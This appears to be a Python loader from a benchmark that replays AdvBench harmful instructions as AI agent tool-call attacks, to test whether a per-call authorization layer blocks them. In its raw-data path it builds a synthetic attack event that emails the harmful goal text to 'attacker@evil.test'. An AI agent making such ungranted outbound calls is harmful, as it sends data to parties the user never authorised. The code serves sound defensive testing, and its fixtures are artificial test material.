"""AdvBench-agent loader, harmful-instruction → tool-attack replay suite.

Builds target-shaped and argument-bound tasks so the enforcement ladder can
actually discriminate. Content-only twins (same tool, same destination, harmful
prose) are out of scope for per-call authorization and are not used as the
score path.
"""
from __future__ import annotations

import csv
import json
import re
from pathlib import Path
from typing import Any
from urllib.parse import urlparse

from benchmarks.core.events import BenchmarkEvent, BenchmarkTask, EventLabel

_FIXTURE = (
    Path(__file__).resolve().parents[1] / "fixtures" / "advbench_agent"
    / "clayseal_traces.jsonl"
)
_URL = re.compile(r"https?://([^/\s\"']+)", re.I)


class AdvBenchAgentLoader:
    name = "advbench_agent"

    def __init__(self, data_root: str | Path | None = None) -> None:
        default = (Path(__file__).resolve().parents[2] / ".benchmark-corpus"
                   / "AdvBench")
        self._data_root = Path(data_root) if data_root else default

    def load(self, *, limit: int | None = None) -> list[BenchmarkTask]:
        normalized = self._data_root / "clayseal_traces.jsonl"
        if not normalized.exists() and _FIXTURE.exists():
            normalized = _FIXTURE
        if normalized.exists():
            tasks = _load_normalized(normalized)
        else:
            tasks = _load_raw(self._data_root)
        if not tasks:
            raise RuntimeError(
                "AdvBench-agent data not found. Place clayseal_traces.jsonl under "
                ".benchmark-corpus/AdvBench/ or use the shipped fixture."
            )
        return tasks[:limit] if limit else tasks


def _path_for(spec: dict[str, Any]) -> str | None:
    if spec.get("path"):
        return str(spec["path"])
    args = spec.get("args") or {}
    url = args.get("url") or args.get("endpoint") or args.get("webhook")
    if isinstance(url, str):
        host = urlparse(url).hostname or (_URL.search(url) or [None, None])[1]
        if host:
            return f"net:{host}"
    to = args.get("to") or args.get("recipient")
    if isinstance(to, str) and ("@" in to or "://" in to):
        if "@" in to:
            return f"net:{to.split('@', 1)[1]}"
        host = urlparse(to).hostname
        if host:
            return f"net:{host}"
    return None


def _event(spec: dict[str, Any], label: EventLabel, event_id: str) -> BenchmarkEvent:
    tool = str(spec.get("tool") or "tool")
    action = str(spec.get("action") or "send")
    return BenchmarkEvent(
        event_id=event_id,
        tool_name=tool,
        resource=f"mcp:tool:{tool}",
        action=action,
        path=_path_for(spec),
        args=dict(spec.get("args") or {}),
        label=label,
        meta={"source": "advbench_agent"},
    )


def _authorization(benign: list[BenchmarkEvent], tools: set[str]) -> dict[str, Any]:
    """Capabilities and arg binding from the BENIGN side only."""
    capabilities = sorted(
        {(e.resource, e.action) for e in benign},
        key=lambda x: (x[0], x[1]),
    )
    authorized_args: dict[str, list[dict[str, Any]]] = {}
    for e in benign:
        if e.args:
            authorized_args.setdefault(e.tool_name, []).append(dict(e.args))
    # Path scope: workspace-style files from benign + net hosts contacted.
    allowed_paths: list[str] = ["/work/**", "/repo/**"]
    for e in benign:
        if not e.path:
            continue
        if e.path.startswith("net:"):
            allowed_paths.append(e.path)
        else:
            allowed_paths.append(e.path)
            parent = str(Path(e.path).parent)
            if parent not in (".", "/"):
                allowed_paths.append(f"{parent}/**")
    actions = sorted({e.action for e in benign} | {"read"})
    # Human-authorization path scope so net:/file destinations bind; tool
    # surface stays on BenchmarkTask.allowed_tools / capabilities.
    return {
        "allowed_tools": tools,
        "capabilities": [{"resource": r, "action": a} for r, a in capabilities],
        "authorized_args": authorized_args,
        "mandate": {
            "schema": "agentauth.human_authorization.v1",
            "mandate_id": "advbench-grant",
            "task": {"summary": "advbench authorized work"},
            "scope": {
                "allowed_paths": sorted(set(allowed_paths)),
                "denied_paths": [],
                "allowed_operations": actions,
            },
        },
    }

def _load_normalized(path: Path) -> list[BenchmarkTask]:
    tasks: list[BenchmarkTask] = []
    with path.open() as handle:
        for i, line in enumerate(handle):
            line = line.strip()
            if not line:
                continue
            case = json.loads(line)
            benign = [
                _event(s, EventLabel.BENIGN, f"advbench-{i}-b{j}")
                for j, s in enumerate(case.get("benign", []))
            ]
            attack = [
                _event(s, EventLabel.ATTACK, f"advbench-{i}-a{j}")
                for j, s in enumerate(case.get("attack", []))
            ]
            if not attack:
                continue
            if not benign:
                benign = [
                    BenchmarkEvent(
                        event_id=f"advbench-{i}-b0",
                        tool_name="web_search",
                        resource="mcp:tool:web_search",
                        action="read",
                        label=EventLabel.BENIGN,
                        meta={"source": "advbench_agent", "synthetic_benign": True},
                    )
                ]
            tools = set(case.get("allowed_tools") or {e.tool_name for e in benign})
            auth = _authorization(benign, tools)
            tasks.append(BenchmarkTask(
                task_id=str(case.get("task_id", f"advbench-{i}")),
                summary=str(case.get("summary", "")),
                events=benign + attack,
                meta={
                    "fidelity": "normalized",
                    "axis": "target_and_argument_binding",
                },
                **auth,
            ))
    return tasks


def _load_raw(root: Path) -> list[BenchmarkTask]:
    csv_path = root / "harmful_behaviors.csv"
    json_path = root / "harmful_behaviors.json"
    rows: list[dict[str, Any]] = []
    if csv_path.exists():
        with csv_path.open() as handle:
            rows = list(csv.DictReader(handle))
    elif json_path.exists():
        raw = json.loads(json_path.read_text())
        rows = raw if isinstance(raw, list) else raw.get("behaviors", [])
    tasks: list[BenchmarkTask] = []
    for i, row in enumerate(rows):
        goal = str(row.get("goal") or row.get("instruction") or "")
        if not goal:
            continue
        benign = [
            BenchmarkEvent(
                event_id=f"advbench-raw-{i}-b0",
                tool_name="web_search",
                resource="mcp:tool:web_search",
                action="read",
                args={"q": goal[:80]},
                label=EventLabel.BENIGN,
                meta={"source": "advbench_agent"},
            )
        ]
        attack = [
            BenchmarkEvent(
                event_id=f"advbench-raw-{i}-a0",
                tool_name="send_email",
                resource="mcp:tool:send_email",
                action="send",
                path="net:evil.test",
                args={"to": "attacker@evil.test", "body": goal[:200]},
                label=EventLabel.ATTACK,
                meta={"source": "advbench_agent", "fidelity": "coarse"},
            )
        ]
        auth = _authorization(benign, {"web_search"})
        tasks.append(BenchmarkTask(
            task_id=f"advbench-raw-{i}",
            summary=goal,
            events=benign + attack,
            meta={"fidelity": "coarse", "axis": "ungranted_tool"},
            **auth,
        ))
    return tasks
